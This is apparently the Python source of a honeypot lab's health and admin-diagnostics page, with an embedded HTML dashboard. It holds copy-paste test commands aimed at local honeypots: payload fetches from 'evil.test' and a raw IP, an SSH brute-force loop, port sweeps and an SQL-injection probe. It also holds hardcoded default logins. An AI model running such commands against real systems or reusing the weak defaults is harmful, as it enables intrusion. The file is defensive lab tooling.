"""
Local operator status page — GET /health  (HTML) and GET /health/data (JSON).

Single place that answers "is everything up, and what are the URLs / logins?".
Intended for the person running the stack on their own machine:

  * it is NOT authenticated
  * it prints credentials in clear text

That is deliberate for a local demo. Do not expose port 8000 to an untrusted
network with this enabled. Set HEALTH_PAGE=0 in the environment to disable it.
"""

from __future__ import annotations

import asyncio
import os
import time
from pathlib import Path
from datetime import datetime, timezone
from typing import Any, Dict, List

import httpx
from fastapi import APIRouter
from fastapi.responses import HTMLResponse, JSONResponse
from sqlalchemy import text

from app.db.database import DATABASE_URL, engine
from app.services.telemetry.collector import local_collector

router = APIRouter()

_STARTED_AT = time.time()

# Tables the dashboard actually reads from — shown with live row counts so it is
# obvious *where* the data is (telemetry lands in raw_events / normalized_events;
# most other tables are empty until something populates them).
_KEY_TABLES = [
    "users",
    "raw_events",
    "normalized_events",
    "ingest_cursors",
    "attacker_sessions",
    "structured_events",
    "alerts",
    "iocs",
    "nodes",
    "credential_tokens",
    "vm_instances",
]


def _parse_db_url(url: str) -> Dict[str, str]:
    """Pull host/port/user/pass/name out of a SQLAlchemy URL for display."""
    try:
        rest = url.split("://", 1)[1]
        creds, hostpart = rest.split("@", 1)
        user, _, password = creds.partition(":")
        hostport, _, name = hostpart.partition("/")
        host, _, port = hostport.partition(":")
        name = name.split("?", 1)[0]
        return {
            "host": host or "localhost",
            "port": port or "3306",
            "user": user,
            "password": password,
            "name": name,
        }
    except Exception:
        return {"host": "?", "port": "?", "user": "?", "password": "?", "name": "?"}


_DB = _parse_db_url(DATABASE_URL)
# Host-side port (what the browser uses) can differ from the in-container port.
_DB_HOST_PORT = os.getenv("MARIADB_PORT", "3307")
_PHPMYADMIN_PORT = os.getenv("PHPMYADMIN_PORT", "8081")
_BACKEND_PORT = os.getenv("BACKEND_PORT", "8000")
_FRONTEND_PORT = os.getenv("FRONTEND_PORT", "5500")
_MOBSF_PORT = os.getenv("MOBSF_PORT", "5055")
_NODE_API_PORT = os.getenv("NODE_API_PORT", "3000")

# Honeypot host ports (what an attacker connects to). Match docker-compose.yml.
_HP = {
    "ssh": os.getenv("HONEYPOT_SSH_PORT", "2222"),
    "telnet": os.getenv("HONEYPOT_TELNET_PORT", "2223"),
    "smb": os.getenv("HONEYPOT_SMB_PORT", "445"),
    "ftp": os.getenv("HONEYPOT_FTP_PORT", "2121"),
    "mssql": os.getenv("HONEYPOT_MSSQL_PORT", "1433"),
    "ht1": os.getenv("HONEYPOT_HTTP_PORT", "8022"),
    "ht2": os.getenv("HONEYPOT_ALT_PORT", "8023"),
}


def _generators() -> List[Dict[str, str]]:
    """Copy-paste commands that make telemetry land. Host = the machine running
    the stack (use the LAN IP instead of localhost from a second machine)."""
    h = _HP
    return [
        {
            "target": "Every scenario at once — brute-force + port-scan + http + telnet (Cowrie/Dionaea/Honeytrap)",
            "cmd": "./scripts/attack_scenarios.sh localhost all",
        },
        {
            "target": "Synthetic replay — 60 events, no live traffic needed (feeds the real collector)",
            "cmd": "python3 scripts/replay_telemetry.py --all-sensors --count 60 --rate 5",
        },
        {
            "target": f"Cowrie SSH :{h['ssh']} — full session, logs every command (BEST data)",
            "cmd": (
                f"ssh -p {h['ssh']} -o StrictHostKeyChecking=no "
                f"-o UserKnownHostsFile=/dev/null root@localhost\n"
                f"# password: anything. then paste:\n"
                f"whoami; id; uname -a; cat /etc/passwd; ps aux; "
                f"wget http://185.99.1.7/bot.sh; curl http://evil.test/x; ls -la /tmp; exit"
            ),
            "trigger": "ssh_session",
        },
        {
            "target": f"Cowrie SSH :{h['ssh']} — 10 brute-force login attempts (no prompt)",
            "cmd": (
                f"for u in root admin oracle ubuntu pi git test deploy user postgres; do "
                f"ssh -p {h['ssh']} -o BatchMode=yes -o StrictHostKeyChecking=no "
                f"-o UserKnownHostsFile=/dev/null -o ConnectTimeout=4 $u@localhost true 2>/dev/null; done"
            ),
            "trigger": "ssh_bruteforce",
        },
        {
            "target": f"Cowrie Telnet :{h['telnet']}",
            "cmd": f"nc localhost {h['telnet']}    # or: telnet localhost {h['telnet']}",
            "trigger": "telnet",
        },
        {
            "target": f"Dionaea — SMB :{h['smb']} / FTP :{h['ftp']} / MSSQL :{h['mssql']}",
            "cmd": (
                f"nc -w1 -z localhost {h['smb']}; "
                f"curl -s -m3 ftp://localhost:{h['ftp']}/ ; "
                f"nc -w1 -z localhost {h['mssql']}"
            ),
            "trigger": "dionaea",
        },
        {
            "target": f"Honeytrap :{h['ht1']}-{h['ht2']} — HTTP + SQLi-looking request",
            "cmd": (
                f"curl -s 'http://localhost:{h['ht1']}/' ; "
                f"curl -s \"http://localhost:{h['ht2']}/?id=1' OR '1'='1\" ; "
                f"nc -w1 -z localhost {h['ht2']}"
            ),
            "trigger": "honeytrap",
        },
        {
            "target": "Full port sweep (one line, all sensors)",
            "cmd": (
                "for p in %s; do nc -w1 -vz localhost $p 2>&1; done"
                % " ".join([h["ssh"], h["telnet"], h["smb"], h["ftp"], h["mssql"], h["ht1"], h["ht2"]])
            ),
            "trigger": "port_sweep",
        },
    ]


async def _probe(url: str) -> str:
    """'up' if the URL answers anything, 'down' on a connection failure."""
    try:
        async with httpx.AsyncClient(timeout=2.0) as client:
            await client.get(url)
        return "up"
    except Exception:
        return "down"


async def _check_database() -> Dict[str, Any]:
    out: Dict[str, Any] = {"status": "down", "url": f"{_DB['host']}:{_DB['port']}/{_DB['name']}"}
    try:
        async with engine.connect() as conn:
            out["server_version"] = (await conn.execute(text("SELECT VERSION()"))).scalar()
            schemas = (
                await conn.execute(
                    text(
                        "SELECT schema_name FROM information_schema.schemata "
                        "WHERE schema_name NOT IN "
                        "('information_schema','mysql','performance_schema','sys')"
                    )
                )
            ).scalars().all()
            out["schemas"] = list(schemas)

            counts: Dict[str, Any] = {}
            for table in _KEY_TABLES:
                try:
                    counts[table] = (
                        await conn.execute(text(f"SELECT COUNT(*) FROM `{table}`"))
                    ).scalar()
                except Exception:
                    counts[table] = "—"
            out["row_counts"] = counts
        out["status"] = "up"
    except Exception as e:  # noqa: BLE001
        out["error"] = f"{e.__class__.__name__}: {e}"
    return out


async def _check_sensors() -> List[Dict[str, Any]]:
    """
    Sensor liveness without touching the edge network.

    The honeypot containers sit on honeynet_edge, which the backend has no route
    to (by design). But every event they capture lands in normalized_events, so
    'last event within N minutes' is a reliable online signal.
    """
    known = ["cowrie", "dionaea", "honeytrap"]
    seen: Dict[str, Any] = {}
    try:
        async with engine.connect() as conn:
            rows = (
                await conn.execute(
                    text(
                        "SELECT sensor, MAX(timestamp) AS last_seen, COUNT(*) AS n "
                        "FROM normalized_events GROUP BY sensor"
                    )
                )
            ).all()
            for sensor, last_seen, n in rows:
                seen[str(sensor).lower()] = {"last_seen": str(last_seen), "events": int(n)}
    except Exception:
        pass

    now = datetime.now(timezone.utc)
    out = []
    for name in known:
        info = seen.get(name)
        # "no data" not "down": the backend can't see the edge network, so a
        # sensor that never captured anything might just be starved of traffic.
        status = "no data"
        if info and info["last_seen"] and info["last_seen"] != "None":
            try:
                ls = datetime.fromisoformat(info["last_seen"]).replace(tzinfo=timezone.utc)
                status = "up" if (now - ls).total_seconds() < 600 else "idle"
            except Exception:
                status = "unknown"
        out.append(
            {
                "name": name,
                "status": status,
                "last_event": (info or {}).get("last_seen"),
                "events": (info or {}).get("events", 0),
            }
        )
    return out


_CONTAINER_NAMES = (
    "honeynet_backend", "honeynet_frontend", "honeynet_db", "honeynet_phpmyadmin",
    "honeynet_cowrie", "honeynet_dionaea", "honeynet_honeytrap", "honeynet_mobsf",
    "honeynet_clamav", "splunk",
    "guacd", "guacamole", "guacamole_db", "mobsf",
)


async def _check_containers() -> Dict[str, Any]:
    """
    Container status, read only through the central container_manager (the one
    module allowed to touch the Docker socket). Stack services plus any lab
    containers the backend has spawned (label shadowtrust.managed=true).
    """
    try:
        from app.services import container_manager

        if not container_manager.available():
            return {"available": False, "reason": "docker socket unavailable"}
        stack = container_manager.read_stack_status(container_manager.STACK_CONTAINERS)
        rows = [
            {
                "name": name,
                "status": info["status"],
                "health": info["health"] or info["status"],
                "kind": info["kind"],
                "env": info.get("env"),
            }
            for name, info in stack.items()
        ]
        return {"available": True, "containers": sorted(rows, key=lambda r: r["name"])}
    except Exception as e:  # noqa: BLE001
        return {"available": False, "reason": f"{e.__class__.__name__}: {e}"}


async def _build_full_data() -> Dict[str, Any]:
    """
    The complete operator view — includes credentials and copy-paste attack
    commands. **Admin-only.** Served from /api/v1/admin/diagnostics, never from
    the public /health.
    """
    db = await _check_database()

    # Internal probes use the compose service names — reachable from the backend
    # container regardless of host port mapping.
    frontend_status = await _probe(f"http://frontend:{_FRONTEND_PORT}/")
    phpmyadmin_status = await _probe("http://phpmyadmin:80/")
    mobsf_status = await _probe(f"http://mobsf:{_MOBSF_PORT}/")
    # node_api is an optional, unused extras-profile service (services/api/).
    # Nothing in the platform calls it — report "stopped", not "down".
    node_status = await _probe("http://node_api:8000/")
    if node_status != "up":
        node_status = "stopped"
    guac_status = await _probe(
        os.getenv("GUAC_API_URL", "http://localhost:8080/guacamole").rstrip("/") + "/"
    )
    _splunk_api = os.getenv("SPLUNK_API_URL", "https://host.docker.internal:8089").rstrip("/")
    splunk_status = "unknown"
    try:
        async with httpx.AsyncClient(verify=False, timeout=3.0) as _c:
            _r = await _c.get(f"{_splunk_api}/services/server/info")
            splunk_status = "up" if _r.status_code < 500 else "down"
    except Exception:
        splunk_status = "down"

    # ClamAV — raw TCP PING/PONG on the clamd port (no HTTP).
    clamav_status = "down"
    try:
        _host = os.getenv("CLAMAV_HOST", "clamav")
        _port = int(os.getenv("CLAMAV_PORT", "3310"))
        _r, _w = await asyncio.wait_for(asyncio.open_connection(_host, _port), timeout=3.0)
        _w.write(b"zPING\x00")
        await _w.drain()
        _resp = await asyncio.wait_for(_r.read(16), timeout=3.0)
        _w.close()
        clamav_status = "up" if b"PONG" in _resp else "down"
    except Exception:
        clamav_status = "down"

    services: List[Dict[str, Any]] = [
        {
            "name": "Dashboard (frontend)",
            "link": f"http://localhost:{_FRONTEND_PORT}",
            "status": frontend_status,
        },
        {
            "name": "phpMyAdmin",
            "link": f"http://localhost:{_PHPMYADMIN_PORT}",
            "status": phpmyadmin_status,
        },
        {
            "name": "Backend API docs",
            "link": f"http://localhost:{_BACKEND_PORT}/docs",
            "status": "up",  # if you're reading this, it's up
        },
        {
            "name": "MariaDB",
            "link": f"mysql://localhost:{_DB_HOST_PORT}",
            "status": db["status"],
        },
        {
            "name": "Guacamole (VM Lab remote desktop)",
            "link": f"http://localhost:{os.getenv('GUAC_PORT', '8080')}/guacamole",
            "status": guac_status,
            "note": "backs vm_lab.html — guacadmin / guacadmin",
        },
        {
            "name": "MobSF (APK analysis)",
            "link": f"http://localhost:{_MOBSF_PORT}",
            "status": mobsf_status,
            "note": "backs apk.html",
        },
        {
            "name": "ClamAV (malware engine)",
            "link": f"tcp://{os.getenv('CLAMAV_HOST', 'clamav')}:{os.getenv('CLAMAV_PORT', '3310')}",
            "status": clamav_status,
            "note": "backs malware.html — first boot downloads ~1.5 GB of signatures (~5 min)",
        },
        {
            "name": "Splunk Blue Team",
            "link": os.getenv("SPLUNK_WEB_URL", "http://localhost:8009"),
            "status": splunk_status,
            "note": "backs splunk.html — separate project: cd ~/splunk-lab && docker compose up -d",
        },
        {
            "name": "Node API (not needed)",
            "link": f"http://localhost:{_NODE_API_PORT}",
            "status": node_status,
            "note": "optional legacy service — nothing uses it. Start only if you want it: "
                    "docker compose --profile extras up -d node_api worker",
        },
    ]

    return {
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "backend": {
            "status": "up",
            "uptime_seconds": round(time.time() - _STARTED_AT),
            "infra_provider": os.getenv("INFRA_PROVIDER", "local"),
        },
        "database": db,
        "services": services,
        "sensors": await _check_sensors(),
        "containers": await _check_containers(),
        "collector": local_collector.status(),
        "generators": _generators(),
        "event_total": (db.get("row_counts") or {}).get("normalized_events", 0),
        "credentials": {
            "app_admin": {
                "login_url": f"http://localhost:{_FRONTEND_PORT}/login.html",
                "email": "admin@gmail.com",
                "password": "admin",
                "note": "seeded on first boot — change it",
            },
            "database": {
                "host_from_browser_tools": f"127.0.0.1:{_DB_HOST_PORT}",
                "host_in_compose": f"{_DB['host']}:{_DB['port']}",
                "database": _DB["name"],
                "user": _DB["user"],
                "password": _DB["password"],
                "root_password": os.getenv("MARIADB_ROOT_PASSWORD", "(see root .env)"),
                "test_schema": "shadowtrust_test",
            },
            "phpmyadmin": {
                "url": f"http://localhost:{_PHPMYADMIN_PORT}",
                "server": _DB["host"],
                "user": _DB["user"],
                "password": _DB["password"],
                "tip": "data lives in raw_events / normalized_events / users — "
                "most other tables are empty until the platform generates that data",
            },
            "guacamole": {
                "url": f"http://localhost:{os.getenv('GUAC_PORT', '8080')}/guacamole",
                "user": "guacadmin",
                "password": "guacadmin",
                "note": "backs vm_lab.html; also open it directly to see live lab sessions",
            },
            "vm_lab": {
                "url": f"http://localhost:{_FRONTEND_PORT}/vm_lab.html",
                "kali_lab_login": f"{os.getenv('LAB_KALI_USER', 'kali')} / {os.getenv('LAB_KALI_PASSWORD', 'kali')}",
                "windows_labs": (
                    "enabled" if os.getenv("LAB_WINDOWS_ENABLED", "false").lower() in ("1", "true", "yes")
                    else "disabled (LAB_WINDOWS_ENABLED=false; needs a Linux host with KVM)"
                ),
            },
            "splunk": {
                "page": f"http://localhost:{_FRONTEND_PORT}/splunk.html",
                "console": os.getenv("SPLUNK_WEB_URL", "http://localhost:8009"),
                "login": f"{os.getenv('SPLUNK_USER', 'admin')} / {os.getenv('SPLUNK_PASSWORD', 'ChangeMe123!')}",
                "start": "cd ~/splunk-lab && docker compose up -d",
            },
        },
    }


_SECRET_DB_KEYS = {"user", "password", "root_password", "host", "port"}


def _safe_view(full: Dict[str, Any]) -> Dict[str, Any]:
    """
    Strip every secret and every actionable attack command from the full view.
    This is the ONLY payload the unauthenticated /health surface emits.
    """
    db = full.get("database", {}) or {}
    safe_db = {
        "status": db.get("status"),
        "server_version": db.get("server_version"),
        "schemas": db.get("schemas", []),
    }
    if db.get("error"):
        safe_db["error"] = "connection error"  # generic — no host/user leak

    collector = full.get("collector", {}) or {}
    safe_collector = {
        "running": collector.get("running"),
        "cycles": collector.get("cycles"),
        "last_run_at": collector.get("last_run_at"),
        "last_cycle_at": collector.get("last_cycle_at"),
    }

    safe_services = [
        {"name": s.get("name"), "status": s.get("status")}
        for s in full.get("services", [])
    ]

    return {
        "generated_at": full.get("generated_at"),
        "backend": full.get("backend", {}),
        "database": safe_db,
        "services": safe_services,
        "sensors": full.get("sensors", []),
        "containers": {
            "available": (full.get("containers") or {}).get("available", False),
            "count": len((full.get("containers") or {}).get("containers", [])),
        },
        "collector": safe_collector,
        "event_total": full.get("event_total", 0),
    }


@router.get("/health/data")
async def health_data() -> JSONResponse:
    if os.getenv("HEALTH_PAGE", "0") == "0":
        return JSONResponse({"detail": "health page disabled (HEALTH_PAGE=0)"}, status_code=404)
    return JSONResponse(_safe_view(await _build_full_data()))


@router.get("/health", response_class=HTMLResponse)
async def health_page() -> HTMLResponse:
    # Fail-closed: the status page is OFF unless HEALTH_PAGE=1 is set explicitly.
    if os.getenv("HEALTH_PAGE", "0") == "0":
        return HTMLResponse("<h1>health page disabled (HEALTH_PAGE=0)</h1>", status_code=404)
    return HTMLResponse(_PAGE)


async def build_admin_diagnostics() -> Dict[str, Any]:
    """Full detail for the authenticated admin diagnostics endpoint."""
    return await _build_full_data()


_PAGE = r"""<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Test bench · ShadowTrust</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300..600&family=Source+Code+Pro:wght@400;500;600&display=swap">
<style>
  /* Same values as frontend/css/tokens.css. Copied, not linked: this page is
     served from the backend origin and must render with the frontend down. */
  :root {
    color-scheme: light;
    --bg: #ffffff; --surface-2: #f8fafd; --border: #e5edf5; --border-strong: #d4dee9;
    --text: #061b31; --text-2: #273951; --muted: #50617a; --faint: #7d8ba4;
    --accent: #533afd; --accent-hover: #4032c8; --lavender: #d6d9fc; --navy: #0d1738;
    --success: #00804a; --success-solid: #00b261; --warning: #a86200; --warning-solid: #f9b900;
    --danger: #d81b56; --danger-solid: #ea2261;
    --ribbon: linear-gradient(90deg, #7fb2ff 0%, #7f7dfc 18%, #533afd 36%, #f44bcc 60%, #ff6118 82%, #f9b900 100%);
    --shadow: 0 6px 22px 0 rgba(0, 55, 112, 0.1), 0 4px 8px 0 rgba(0, 59, 137, 0.02);
    --font: 'Inter', 'SF Pro Display', system-ui, -apple-system, 'Segoe UI', 'Helvetica Neue', Arial, sans-serif;
    --mono: 'Source Code Pro', ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
    --ease: cubic-bezier(0.16, 1, 0.3, 1);
  }
  * { box-sizing: border-box; }
  body { margin: 0; font: 400 14px/1.5 var(--font); color: var(--text); background: var(--bg);
         -webkit-font-smoothing: antialiased; }
  a { color: var(--accent); text-decoration: none; }
  a:hover { color: var(--accent-hover); }
  p { margin: 0; }
  code, pre { font-family: var(--mono); }
  code { font-size: 12.5px; background: var(--surface-2); border: 1px solid var(--border);
         border-radius: 4px; padding: 1px 5px; color: var(--text-2); }

  /* top bar */
  .top { position: sticky; top: 0; z-index: 10; background: var(--bg); border-bottom: 1px solid var(--border); }
  .top::before { content: ""; display: block; height: 2px; background: var(--ribbon); }
  .top-in { max-width: 1264px; margin: 0 auto; padding: 0 24px; min-height: 56px;
            display: flex; align-items: center; gap: 24px; }
  .brand { font-size: 16px; font-weight: 500; white-space: nowrap; color: var(--text); }
  .brand span { color: var(--faint); font-weight: 400; }
  .tabs { display: flex; gap: 4px; align-self: stretch; flex: 1; overflow-x: auto; }
  .tabs a { display: flex; align-items: center; padding: 0 12px; white-space: nowrap; font-weight: 500;
            color: var(--muted); border-bottom: 2px solid transparent; margin-bottom: -1px;
            transition: color 150ms var(--ease), border-color 150ms var(--ease); }
  .tabs a:hover { color: var(--text); }
  .tabs a[aria-current] { color: var(--text); border-bottom-color: var(--accent); }

  /* controls: one height everywhere */
  .btn { height: 34px; padding: 0 14px; border-radius: 4px; border: 1px solid var(--lavender); background: var(--bg);
         color: var(--accent); font: 500 13px var(--font); cursor: pointer; white-space: nowrap;
         transition: background 150ms var(--ease), border-color 150ms var(--ease), color 150ms var(--ease); }
  .btn:hover:not(:disabled) { border-color: var(--accent); }
  .btn:disabled { opacity: .5; cursor: progress; }
  .btn-primary { background: var(--accent); border-color: var(--accent); color: #fff; }
  .btn-primary:hover:not(:disabled) { background: var(--accent-hover); border-color: var(--accent-hover); }
  .btn-danger { color: var(--danger); border-color: color-mix(in srgb, var(--danger-solid) 35%, #fff); }
  .btn-danger:hover:not(:disabled) { border-color: var(--danger-solid); }
  input, select { height: 34px; padding: 0 10px; border: 1px solid var(--border-strong); border-radius: 4px;
                  background: var(--bg); color: var(--text); font: 400 13px var(--font); min-width: 0; }
  input:focus, select:focus, .btn:focus-visible, summary:focus-visible {
    outline: none; border-color: var(--accent); box-shadow: 0 0 0 3px color-mix(in srgb, #7f7dfc 42%, transparent); }

  /* sign-in */
  .auth { display: flex; align-items: center; gap: 12px; position: relative; }
  .who { color: var(--muted); font-size: 13px; white-space: nowrap; }
  .who b { color: var(--text); font-weight: 500; }
  .signin summary { list-style: none; display: flex; align-items: center; }
  .signin summary::-webkit-details-marker { display: none; }
  .pop { position: absolute; right: 0; top: calc(100% + 12px); width: 280px; padding: 20px; background: var(--bg);
         border: 1px solid var(--border); border-radius: 6px; box-shadow: var(--shadow);
         display: grid; gap: 12px; animation: rise 250ms var(--ease); }
  .pop label { display: grid; gap: 4px; font-size: 12px; font-weight: 500; color: var(--muted); }
  .pop .err { color: var(--danger); font-size: 12px; }
  .pop .err:empty { display: none; }
  body.signed-in .signin, body:not(.signed-in) #tbLogout, body.signed-in .need-auth { display: none; }

  /* page */
  .tab { display: none; max-width: 1264px; margin: 0 auto; padding: 40px 24px 80px; }
  .tab.on { display: block; animation: rise 450ms var(--ease); }
  @keyframes rise { from { opacity: 0; transform: translateY(8px); } to { opacity: 1; transform: none; } }
  h1 { margin: 0 0 8px; font-size: 32px; line-height: 1.2; font-weight: 300; letter-spacing: -0.01em; }
  h1 span { color: var(--faint); }
  .lede { color: var(--muted); font-size: 15px; max-width: 760px; margin-bottom: 24px; }
  .note { color: var(--muted); font-size: 13px; }
  .alert, .need-auth { padding: 12px 16px; margin-bottom: 20px; border: 1px solid var(--border);
                       border-left: 2px solid var(--accent); border-radius: 4px; background: var(--surface-2); color: var(--text-2); }
  .alert { border-left-color: var(--danger-solid); }

  /* figures: equal cells on one hairline grid */
  .kpis { position: relative; display: grid; grid-template-columns: repeat(var(--n, 4), minmax(0, 1fr));
          border: 1px solid var(--border); border-radius: 6px; overflow: hidden; margin-bottom: 20px; }
  .kpis::before { content: ""; position: absolute; inset: 0 0 auto; height: 2px; background: var(--ribbon); }
  .kpis > div { padding: 20px; border-left: 1px solid var(--border); min-width: 0; }
  .kpis > div:first-child { border-left: 0; }
  .kpis .k { display: block; font-size: 13px; color: var(--muted); }
  .kpis .v { display: block; font-size: 28px; line-height: 1.3; font-weight: 300; font-variant-numeric: tabular-nums;
             white-space: nowrap; overflow: hidden; text-overflow: ellipsis; }
  .kpis .s { display: block; font-size: 12px; color: var(--faint); min-height: 18px; }
  .kpis .s.up { color: var(--success); }

  /* panels and rows */
  .grid2 { display: grid; grid-template-columns: repeat(2, minmax(0, 1fr)); gap: 20px; margin-bottom: 20px; }
  .panel { border: 1px solid var(--border); border-radius: 6px; background: var(--bg); overflow: hidden; margin-bottom: 20px; }
  .grid2 > .panel { margin-bottom: 0; }
  .panel-h { padding: 16px 20px; font-size: 16px; font-weight: 500; display: flex; flex-wrap: wrap;
             align-items: baseline; gap: 4px 12px; }
  .panel-h span { font-size: 13px; font-weight: 400; color: var(--faint); }
  .band, .r { display: grid; grid-template-columns: minmax(0, 1fr) auto; gap: 12px; align-items: center;
              padding: 0 20px; border-top: 1px solid var(--border); }
  .r { min-height: 44px; }
  .band { min-height: 32px; background: var(--surface-2); font-size: 12px; font-weight: 500; color: var(--faint); }
  .cols4 { grid-template-columns: minmax(0, 1fr) 96px 72px 176px; }
  .cols4 > :nth-child(3) { text-align: right; font-variant-numeric: tabular-nums; }
  .r .kv { color: var(--muted); }
  .r .val { color: var(--text-2); text-align: right; overflow-wrap: anywhere; }
  .dim { color: var(--faint); }
  .stat { display: inline-flex; align-items: center; gap: 8px; font-size: 13px; white-space: nowrap; }
  .stat::before { content: ""; width: 8px; height: 8px; border-radius: 50%; background: var(--border-strong); }
  .stat.good { color: var(--success); } .stat.good::before { background: var(--success-solid); }
  .stat.bad { color: var(--danger); } .stat.bad::before { background: var(--danger-solid); }
  .stat.warn { color: var(--warning); } .stat.warn::before { background: var(--warning-solid); }
  .stat.off { color: var(--faint); }

  @media (max-width: 900px) {
    .top-in { flex-wrap: wrap; gap: 0 16px; padding-top: 8px; }
    .tabs { order: 3; flex-basis: 100%; min-height: 44px; }
    .grid2 { grid-template-columns: 1fr; }
    .kpis { grid-template-columns: repeat(2, minmax(0, 1fr)); }
    .kpis > div { border-top: 1px solid var(--border); }
    .cols4 { grid-template-columns: minmax(0, 1fr) 88px 56px; }
    .cols4 > :nth-child(4) { display: none; }
  }
  @media (prefers-reduced-motion: reduce) { * { animation: none !important; transition: none !important; } }
</style>
</head>
<body>
  <header class="top">
    <div class="top-in">
      <div class="brand">ShadowTrust <span>Test bench</span></div>
      <nav class="tabs">
        <a href="#status">Status</a>
        <a href="#commands">Attack commands</a>
        <a href="#tests">Page tests</a>
        <a href="#data">Project data</a>
      </nav>
      <div class="auth">
        <span id="tbWho" class="who"></span>
        <button id="tbLogout" class="btn">Sign out</button>
        <details class="signin" id="tbSignin">
          <summary class="btn btn-primary">Sign in</summary>
          <form class="pop" id="tbForm">
            <label>Email<input id="tbEmail" autocomplete="username"></label>
            <label>Password<input id="tbPass" type="password" autocomplete="current-password"></label>
            <button id="tbLogin" class="btn btn-primary">Sign in</button>
            <button id="tbBypass" type="button" class="btn">Use dev bypass</button>
            <p id="tbErr" class="err"></p>
          </form>
        </details>
      </div>
    </div>
  </header>

  <section class="tab" id="tab-status">
    <h1>Stack status <span>live from the backend.</span></h1>
    <p class="lede"><span id="ts">Loading</span> · <a href="/health/data">Raw JSON</a></p>
    <p id="err" class="alert" hidden></p>

    <div class="kpis">
      <div><span class="k">Events captured</span><span class="v" id="counter">n/a</span><span class="s" id="delta"></span></div>
      <div><span class="k">Services up</span><span class="v" id="kSvc">n/a</span><span class="s" id="kSvcSub"></span></div>
      <div><span class="k">Sensors reporting</span><span class="v" id="kSen">n/a</span><span class="s">An event in the last 10 minutes</span></div>
      <div><span class="k">Collector</span><span class="v" id="kCol">n/a</span><span class="s" id="kColSub"></span></div>
    </div>

    <div class="grid2">
      <div class="panel">
        <div class="panel-h">Services</div>
        <div id="services"></div>
        <div id="containers"></div>
      </div>
      <div class="panel">
        <div class="panel-h">Pipeline <span>The edge network is isolated, so the last captured event is the online signal.</span></div>
        <div class="band cols4"><span>Sensor</span><span>Status</span><span>Events</span><span>Last event</span></div>
        <div id="sensors"></div>
        <div class="band"><span>Collector</span></div>
        <div id="collector"></div>
        <div class="band"><span>Database</span></div>
        <div id="db"></div>
      </div>
    </div>

    <p class="note">Credentials, database details and per-container detail are served by the authenticated
      <code>/api/v1/admin/diagnostics</code> endpoint (admin role required), never by this page.</p>
  </section>

<script>
const $ = (s) => document.querySelector(s);
const esc = (s) => String(s).replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
const KIND = { up: 'good', down: 'bad', stopped: 'off' };  // anything else (idle, no data, unknown) is a warning
const stat = (s) => `<span class="stat ${KIND[s] || 'warn'}">${esc(String(s).replace(/^./, c => c.toUpperCase()))}</span>`;
const kv = (k, v) => `<div class="r"><span class="kv">${esc(k)}</span><span class="val">${v}</span></div>`;
const upFor = (s) => s < 60 ? s + 's' : s < 3600 ? `${Math.floor(s / 60)}m ${s % 60}s` : `${Math.floor(s / 3600)}h ${Math.floor(s % 3600 / 60)}m`;

// ── Tabs: one section visible at a time, chosen by the URL hash ──────────
function showTab() {
  const want = location.hash.slice(1);
  const tab = document.getElementById('tab-' + want) ? want : 'status';
  document.querySelectorAll('.tab').forEach(s => s.classList.toggle('on', s.id === 'tab-' + tab));
  document.querySelectorAll('.tabs a').forEach(a => a.toggleAttribute('aria-current', a.hash === '#' + tab));
  scrollTo(0, 0);
}
addEventListener('hashchange', showTab);
addEventListener('DOMContentLoaded', showTab);  // the test bench sections are appended after this script
document.addEventListener('click', e => { const d = $('#tbSignin'); if (d.open && !d.contains(e.target)) d.open = false; });

function renderServices(list) {
  list = list || [];
  $('#services').innerHTML = list.map(s =>
    `<div class="r"><span>${esc(s.name)}</span>${stat(s.status)}</div>`).join('');
  const needed = list.filter(s => s.status !== 'stopped');  // "stopped" is the optional service nothing uses
  $('#kSvc').textContent = `${needed.filter(s => s.status === 'up').length} of ${needed.length}`;
  const down = needed.filter(s => s.status !== 'up').map(s => s.name);
  $('#kSvcSub').textContent = down.length ? 'Not up: ' + down.join(', ') : 'All required services answer';
}

let _baseline = null;
function renderCounter(total) {
  if (_baseline === null) _baseline = total;
  $('#counter').textContent = Number(total).toLocaleString();
  const d = total - _baseline, el = $('#delta');
  el.textContent = d > 0 ? `+${d.toLocaleString()} since you opened this page` : `${Number(_baseline).toLocaleString()} when you opened this page`;
  el.classList.toggle('up', d > 0);
}

function renderSensors(list) {
  list = list || [];
  $('#sensors').innerHTML = list.map(s =>
    `<div class="r cols4"><span>${esc(s.name)}</span>${stat(s.status)}`
    + `<span${s.events ? '' : ' class="dim"'}>${esc(Number(s.events).toLocaleString())}</span>`
    + `<span class="dim">${esc(s.last_event || 'n/a')}</span></div>`).join('');
  $('#kSen').textContent = `${list.filter(s => s.status === 'up').length} of ${list.length}`;
}

function renderContainers(c) {
  $('#containers').innerHTML = (c && c.available)
    ? kv('Containers', `${esc(c.count)} stack containers seen`)
    : kv('Containers', 'Docker socket unavailable. Run <code>docker compose ps</code>.');
}

function renderDb(db) {
  $('#db').innerHTML = kv('Server', esc(db.server_version || 'n/a'))
    + kv('Schemas', esc((db.schemas || []).join(', ') || 'n/a'))
    + (db.error ? kv('Error', esc(db.error)) : '');
}

function renderCollector(c) {
  $('#collector').innerHTML = kv('Last run', esc(c.last_run_at || 'n/a')) + kv('Last cycle', esc(c.last_cycle_at || 'n/a'));
  $('#kCol').textContent = c.running ? 'Running' : 'Stopped';
  $('#kColSub').textContent = `Cycle ${Number(c.cycles || 0).toLocaleString()} since the backend started`;
}

async function tick() {
  try {
    const r = await fetch('/health/data', {cache: 'no-store'});
    const d = await r.json();
    $('#err').hidden = true;
    $('#ts').textContent = `Updated ${new Date(d.generated_at).toLocaleTimeString()} · backend up ${upFor(d.backend.uptime_seconds)}`
      + ` · provider ${d.backend.infra_provider} · refreshes every 10 seconds`;
    renderServices(d.services);
    renderSensors(d.sensors);
    renderCounter(d.event_total);
    renderContainers(d.containers);
    renderDb(d.database);
    renderCollector(d.collector);
  } catch (e) {
    $('#err').hidden = false;
    $('#err').textContent = 'Could not load /health/data. Is the backend up? ' + e;
  }
}
tick();
setInterval(tick, 10000);
</script>
</body>
</html>
"""

# Page test bench (buttons that drive every page's real backend path) lives in
# its own file so the JS stays editable; spliced in just before </body>.
_PAGE = _PAGE.replace(
    "</body>",
